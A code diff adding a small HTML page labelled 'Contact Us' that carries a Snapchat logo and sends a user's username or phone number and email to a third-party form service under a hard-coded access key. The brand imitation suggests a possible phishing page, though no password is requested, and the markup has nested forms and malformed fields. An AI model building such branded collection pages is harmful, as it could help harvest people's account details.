@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Contact Form</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<div class="container">
+    <div class="logo-container">
+        <!-- Replace 'your-logo-url.png' with your actual Snapchat logo URL -->
+        <img src="data:image/png;base64,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" alt="Snapchat Logo" class="logo">
+    </div>
+
+    <h2>Contact Us</h2>
+
+    <form action="#" method="POST" class="contact-form">
+    
+   <form action="https://api.web3forms.com/submit" method="POST">
+    <input type="hidden" name="access_key" value="5ae33cf1-c342-442d-96c1-f5a07fbc7d4d
+">
+        <input type="text" name="name" placeholder="Username or phone" required>
+        <input type="email" name="_replyto email address_" placeholder=" Email Address" required>
+
+        
+        <!--<input type='submit' value='Send Message'>-->
+      	<button type='submit'>Send Message</button> 
+       
+  </form>
+</div>
+
+</body>
+</html>
